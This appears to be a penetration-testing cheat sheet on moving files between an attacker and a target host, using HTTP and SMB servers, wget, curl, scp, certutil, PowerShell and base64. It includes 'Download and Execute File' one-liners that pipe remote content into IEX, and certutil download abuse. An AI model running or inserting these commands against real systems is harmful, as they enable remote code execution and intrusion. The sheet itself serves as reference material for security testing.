---
Primary_category: "[[PENTESTING ROOT]]"
title: "FILE TRANSFERS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[PENTESTING ROOT]]

#### File Transfer Servers

##### HTTP

- ***Simple HTTP Servers***

> ***[Reference](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server)***

###### *Python*

```bash
python3 -m http.server <PORT>
```

###### *NodeJS*

```bash title="Attacker"
npx http-server /path/to/project -o -p 1234
```

###### *PHP*

```bash title="Attacker"
php -S localhost:1234
```

##### SMB

###### *Smbserver (Impacket)*

> ***[Reference](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)***

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

---

#### Linux File Transfer Agents

##### HTTP

###### *Wget*

- ***Same Name as Origin***

```bash
wget <URL>
```

- ***Different Name as Origin***

```bash
wget --output-document "<URL>" # Long Format
wget -O "<URL>" # Short Format
```

###### *Curl*

- ***Same Name as Origin***

```bash
curl --silent --request GET --location --remote-name "<URL>" # Long Format
curl -sX GET -LO "<URL>" # Short Format
```

- ***Different Name as Origin***

```bash
curl --silent --request GET --location --output "<FILE>" "<URL>" # Long Format
curl -sX GET -Lo "<FILE>" "<URL>" # Short Format
```

##### SSH

If *SSH* access to the target is available, proceed as follows →

###### *SFTP*

```bash title="Attacker"
scp -P<PORT> /path/to/local/resource <USER>@<TARGET>:/destination/path
```

###### *SCP*

```bash title="Attacker"
sftp -P<PORT> <USER>@<TARGET>
```

```bash title="Target"
cd /destination/path # Remote Path
put /path/to/local/resource
exit
```

##### Base64

> ***[Man Page](https://linux.die.net/man/1/base64)***

###### *Encode the file content to Base64*

```bash title="Attacker"
base64 -w 0 /path/to/local/resource
```

###### *Decode the *Base64* string*

```bash
base64 -d <<< "BASE64_STRING" > /destination/path
```

##### File Transfer Validation

###### *Check File Type transferred*

```bash
file <FILE>
```

###### *Check File Integrity*

> ***Run this command on both the Attacker and the Target Hosts***

```bash
md5sum <FILE>
sha256sum <FILE>
sha512sum <FILE>
```


---

#### Windows File Transfer Agents

##### HTTP

###### *Certutil.exe*

> ***CMD & PS***

- ***Download File***

```powershell
certutil.exe -urlcache -split -f '<URL>'
```

###### *IWR - Invoke-WebRequest*

> ***PS v3.0 >***

- ***Download File***

```powershell
IWR -UseBasicParsing -OutFile '.\<FILE>' -Uri '<URL>' # Or Invoke-WebRequest
```

- ***Download and Execute File***

```powershell
IEX (IWR -UseBasicParsing -Uri '<URL>') # Or Invoke-Expression (Invoke-WebRequest <ARGS>)
```

###### *New-Object*

> ***PS***

- ***Download File***

```powershell
(New-Object Net.WebClient).DownloadString('<URL>') > .\<FILE>
```

```powershell
(New-Object Net.WebClient).DownloadFile('<URL>', '<FILE>')
```

- ***Download and Execute File***

```powershell
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

##### SMB

First, an [[#*SMB*|SMB Server]] has to be deployed at one of the endpoints

###### *Net use*

> ***CMD & PS***

```powershell
net use \\<ATTACKER>\<SHARE_NAME> /user:<USER> <PASSWORD>
```

###### *New-PSDrive*

> ***PS***

```powershell
$Passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$Cred = New-Object PSCredential("<USER>", $Passwd)
New-PSDrive -Name <NAME> -PSProvider FileSystem -Root "\\<ATTACKER>\<SHARE_NAME>" -Credential $Cred
```

> [!DANGER]- *Oneliner*
>
> ```powershell
> New-PSDrive -Name NAME -PSProvider FileSystem -Root "\\TARGET\SHARE_NAME" -Credential (New-Object PSCredential("USER", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force)))
> ```
>

##### Base64

###### *Encode the file content to Base64*

- ***Powershell (.NET)***

> ***PS***

```powershell
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("<FILE_FULL_PATH>"))
```

- ***Certutil.exe***

> ***CMD & PS***

```powershell title="Certutil"
certutil.exe -encode <INPUT_FILE> <OUTPUT_FILE>
```

###### *Decode the *Base64* string*

```bash
base64 -d <<< "BASE64_STRING" > /destination/path
```